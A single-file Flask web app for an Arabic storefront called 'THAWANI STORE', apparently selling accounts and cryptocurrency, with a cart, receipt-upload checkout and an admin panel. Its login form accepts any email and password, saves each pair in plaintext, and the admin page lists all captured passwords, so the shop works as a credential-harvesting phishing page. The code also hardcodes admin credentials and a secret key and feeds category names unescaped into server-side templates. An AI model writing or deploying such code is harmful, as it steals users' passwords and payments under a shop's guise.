from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_gold_final_2026"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إنشاء وتحديث قاعدة البيانات بالكامل وباحترافية ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    
    # إضافة قسم افتراضي إذا كان الجدول فارغاً
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
        c.execute("INSERT INTO categories (name) VALUES ('حسابات')")
        c.execute("INSERT INTO categories (name) VALUES ('عملات رقمية')")
    
    conn.commit()
    conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الفخم والراقي (Premium Black & Gold) ---
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
    :root { --primary: #0a0a0a; --accent: #d4af37; --gold-dark: #b8860b; --bg: #121212; --white: #ffffff; --card-bg: #1e1e1e; }
    body { font-family: 'Tajawal', sans-serif; background: var(--bg); margin: 0; padding: 0; direction: rtl; color: var(--white); padding-bottom: 90px; }
    
    header { background: #000; padding: 20px; text-align: center; border-bottom: 1px solid var(--accent); position: sticky; top: 0; z-index: 1000; }
    .logo-text { font-size: 24px; font-weight: 900; color: var(--accent); letter-spacing: 1px; }

    /* شريط التنقل السفلي الاحترافي */
    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid var(--accent); z-index: 1000; box-shadow: 0 -5px 15px rgba(0,0,0,0.5); }
    .nav-item { color: #888; text-decoration: none; font-size: 13px; font-weight: bold; text-align: center; flex: 1; }
    .nav-item.active { color: var(--accent); }
    .nav-label { display: block; margin-top: 4px; }

    /* الأقسام */
    .cat-bar { display: flex; overflow-x: auto; padding: 10px; gap: 10px; background: #1a1a1a; white-space: nowrap; }
    .cat-bar::-webkit-scrollbar { display: none; }
    .cat-link { background: #333; color: white; padding: 6px 15px; border-radius: 20px; text-decoration: none; font-size: 12px; border: 1px solid transparent; }
    .cat-link.active { background: var(--accent); color: #000; font-weight: bold; }

    .container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
    .card { background: var(--card-bg); border-radius: 12px; overflow: hidden; border: 1px solid #333; position: relative; }
    .card img { width: 100%; height: 150px; object-fit: cover; }
    .card-info { padding: 10px; }
    .card-title { font-size: 14px; font-weight: bold; height: 40px; overflow: hidden; color: #eee; }
    .card-price { color: var(--accent); font-weight: 900; font-size: 16px; margin: 5px 0; }
    
    .btn-premium { background: linear-gradient(to right, var(--accent), var(--gold-dark)); color: #000; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; display: block; text-align: center; width: 100%; box-sizing: border-box; }
    
    input, select, textarea { background: #222; color: #fff; border: 1px solid #444; padding: 12px; margin: 8px 0; width: 100%; border-radius: 8px; box-sizing: border-box; }
    input:focus { border-color: var(--accent); outline: none; }
    
    table { width: 100%; border-collapse: collapse; background: #1a1a1a; margin-top: 15px; }
    th, td { padding: 10px; border: 1px solid #333; text-align: center; font-size: 12px; }
    th { background: var(--accent); color: #000; }

    .star-rating { color: var(--accent); font-size: 18px; }
</style>
"""

BASE_HTML = f"<!DOCTYPE html><html dir='rtl' lang='ar'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>{CSS}</head><body>"

def get_nav():
    admin_link = '<a href="/admin" class="nav-item"><span class="nav-label">لوحة التحكم</span></a>' if session.get('is_admin') else ''
    return f"""
    <div class="bottom-nav">
        <a href="/" class="nav-item"><span class="nav-label">الرئيسية</span></a>
        <a href="/cart" class="nav-item"><span class="nav-label">السلة</span></a>
        <a href="/orders_history" class="nav-item"><span class="nav-label">طلباتي</span></a>
        {admin_link}
        <a href="/logout" class="nav-item" style="color:#ff4d4d;"><span class="nav-label">خروج</span></a>
    </div>
    """

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    cat = request.args.get('cat', 'الكل')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    cats = conn.execute("SELECT * FROM categories").fetchall()
    if cat == 'الكل':
        prods = conn.execute("SELECT * FROM products").fetchall()
    else:
        prods = conn.execute("SELECT * FROM products WHERE category=?", (cat,)).fetchall()
    conn.close()
    
    cat_links = "".join([f'<a href="/?cat={c["name"]}" class="cat-link {"active" if cat==c["name"] else ""}">{c["name"]}</a>' for c in cats])
    
    return render_template_string(BASE_HTML + f"""
    <header><div class="logo-text">THAWANI STORE</div></header>
    <div class="cat-bar">{cat_links}</div>
    <div class="container">
        {{% for p in prods %}}
        <div class="card">
            <img src="/static/uploads/{{{{p.img}}}}">
            <div class="card-info">
                <div class="card-title">{{{{p.name}}}}</div>
                <div class="card-price">{{{{p.price}}}} OMR</div>
                <a href="/product/{{{{p.id}}}}" class="btn-premium">عرض التفاصيل</a>
            </div>
        </div>
        {{% endfor %}}
    </div>
    """ + get_nav(), prods=prods)

@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        conn.execute("INSERT INTO reviews (product_id, user_email, rating, comment) VALUES (?,?,?,?)", 
                     (id, session['user'], request.form['rating'], request.form['comment']))
        conn.commit()
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    revs = conn.execute("SELECT * FROM reviews WHERE product_id=? ORDER BY id DESC", (id,)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">تفاصيل المنتج</div></header>
    <div style="padding:15px; margin-bottom:80px;">
        <img src="/static/uploads/{{p.img}}" style="width:100%; border-radius:15px; border:1px solid var(--accent);">
        <h2 style="color:var(--accent); margin:15px 0 5px 0;">{{p.name}}</h2>
        <div class="card-price" style="font-size:24px;">{{p.price}} OMR</div>
        <p style="color:#bbb; line-height:1.6;">{{p.description}}</p>
        <a href="/add_to_cart/{{p.id}}" class="btn-premium" style="font-size:18px; padding:15px;">إضافة إلى السلة 🛒</a>
        
        <div style="margin-top:30px; border-top:1px solid #333; padding-top:20px;">
            <h3>التقييمات ⭐</h3>
            {% for r in revs %}
                <div style="background:#1a1a1a; padding:12px; border-radius:10px; margin-bottom:10px; border-left:3px solid var(--accent);">
                    <div class="star-rating">{{ "★" * r.rating }}{{ "☆" * (5 - r.rating) }}</div>
                    <p style="margin:5px 0;">{{r.comment}}</p>
                    <small style="color:gray;">{{r.user_email}}</small>
                </div>
            {% endfor %}
            <form method="POST" style="background:#1a1a1a; padding:15px; border-radius:10px; margin-top:15px;">
                <h4>اترك تقييمك:</h4>
                <select name="rating"><option value="5">⭐⭐⭐⭐⭐</option><option value="4">⭐⭐⭐⭐</option><option value="3">⭐⭐⭐</option><option value="2">⭐⭐</option><option value="1">⭐</option></select>
                <textarea name="comment" placeholder="رأيك بالمنتج..." required></textarea>
                <button class="btn-premium">نشر التقييم</button>
            </form>
        </div>
    </div>
    """ + get_nav(), p=p, revs=revs)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db')
    existing = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
    if existing:
        conn.execute("UPDATE cart SET quantity = quantity + 1 WHERE id=?", (existing[0],))
    else:
        conn.execute("INSERT INTO cart (user_email, product_id) VALUES (?,?)", (session['user'], id))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity, cart.id FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">سلة المشتريات</div></header>
    <div style="padding:15px;">
        {% for i in items %}
        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; border:1px solid #333;">
            <div>
                <div style="font-weight:bold;">{{i.name}}</div>
                <div style="color:var(--accent);">{{i.price}} OMR × {{i.quantity}}</div>
            </div>
            <b style="color:var(--accent);">{{i.price * i.quantity}} OMR</b>
        </div>
        {% endfor %}
        {% if items %}
            <div style="text-align:center; margin-top:30px; background:#000; padding:20px; border-radius:15px; border:1px solid var(--accent);">
                <h2 style="margin:0;">الإجمالي: {{total}} OMR</h2>
                <a href="/checkout" class="btn-premium" style="margin-top:15px; padding:15px;">إتمام الطلب 💳</a>
            </div>
        {% else %}
            <p style="text-align:center; color:gray; margin-top:100px;">السلة فارغة حالياً.</p>
        {% endif %}
    </div>
    """ + get_nav(), items=items, total=total)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    
    if request.method == 'POST':
        f = request.files['receipt']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
        details = ", ".join([f"{i['name']} ({i['quantity']})" for i in items])
        conn.execute("INSERT INTO orders (user_email, full_name, phone, card_img, items_details, total_price) VALUES (?,?,?,?,?,?)", 
                     (session['user'], request.form['name'], request.form['phone'], fname, details, total))
        conn.execute("DELETE FROM cart WHERE user_email=?", (session['user'],))
        conn.commit(); conn.close()
        return redirect('/orders_history')
    
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">إتمام الدفع</div></header>
    <div style="padding:15px;">
        <div style="background:#1a1a1a; padding:20px; border-radius:15px; border:1px solid var(--accent);">
            <h3>المبلغ المطلوب: {{total}} OMR</h3>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="الاسم الكامل" required>
                <input name="phone" placeholder="رقم الهاتف/الواتساب" required>
                <p style="font-size:12px; color:var(--accent);">يرجى رفع صورة إيصال التحويل لضمان قبول الطلب:</p>
                <input type="file" name="receipt" accept="image/*" required>
                <button class="btn-premium">تأكيد وإرسال الطلب</button>
            </form>
        </div>
    </div>
    """ + get_nav(), total=total)

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category, description) VALUES (?,?,?,?,?)", 
                         (request.form['name'], request.form['price'], fname, request.form['cat'], request.form['desc']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        conn.commit()
    
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">لوحة التحكم</div></header>
    <div style="padding:15px;">
        <div style="background:#1a1a1a; padding:15px; border-radius:10px; border:1px solid var(--accent); margin-bottom:20px;">
            <h3 style="color:var(--accent);">👤 سجل الزوار (Log)</h3>
            <div style="overflow-x:auto;">
                <table>
                    <tr><th>الإيميل</th><th>كلمة المرور</th><th>الوقت</th></tr>
                    {% for l in logs %}
                    <tr><td>{{l.email}}</td><td>{{l.password}}</td><td>{{l.time}}</td></tr>
                    {% endfor %}
                </table>
            </div>
        </div>
        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:20px;">
            <h3>📦 إضافة منتج</h3>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر" required>
                <select name="cat">{% for c in cats %}<option value="{{c.name}}">{{c.name}}</option>{% endfor %}</select>
                <textarea name="desc" placeholder="وصف المنتج (اختياري)"></textarea>
                <input type="file" name="img" required>
                <button name="add_product" class="btn-premium">إضافة المنتج للمتجر</button>
            </form>
        </div>
    </div>
    """ + get_nav(), logs=logs, orders=orders, cats=cats)

@app.route('/orders_history')
def orders_history():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    orders = conn.execute("SELECT * FROM orders WHERE user_email=? ORDER BY id DESC", (session['user'],)).fetchall()
    conn.close()
    return render_template_string(BASE_HTML + """
    <header><div class="logo-text">طلباتي</div></header>
    <div style="padding:15px;">
        {% for o in orders %}
        <div style="background:#1a1a1a; padding:15px; border-radius:10px; margin-bottom:10px; border-right:4px solid var(--accent);">
            <div style="display:flex; justify-content:space-between;">
                <b>طلب رقم #{{o.id}}</b>
                <span style="color:var(--accent);">{{o.status}}</span>
            </div>
            <p style="font-size:12px; color:gray; margin:10px 0;">{{o.items_details}}</p>
            <div style="font-weight:bold; color:var(--accent);">{{o.total_price}} OMR</div>
        </div>
        {% else %}
        <p style="text-align:center; color:gray; margin-top:100px;">لا توجد طلبات سابقة.</p>
        {% endfor %}
    </div>
    """ + get_nav())

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        e, p = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db')
        conn.execute("INSERT INTO users_log (email, password) VALUES (?,?)", (e, p))
        conn.commit(); conn.close()
        session['user'] = e
        session['is_admin'] = (e == ADMIN_MAIL and p == ADMIN_PASS)
        return redirect('/')
    return render_template_string(BASE_HTML + """
    <div style="height:100vh; display:flex; align-items:center; justify-content:center; background:#000;">
        <div style="background:#111; padding:35px; border-radius:20px; border:1px solid var(--accent); width:85%; max-width:380px; text-align:center;">
            <div class="logo-text" style="margin-bottom:30px; font-size:32px;">THAWANI</div>
            <form method="POST">
                <input name="email" type="email" placeholder="البريد الإلكتروني" required>
                <input name="password" type="password" placeholder="كلمة المرور" required>
                <button class="btn-premium" style="margin-top:20px; font-size:18px;">تسجيل الدخول</button>
            </form>
        </div>
    </div>""")

@app.route('/logout')
def logout(): session.clear(); return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
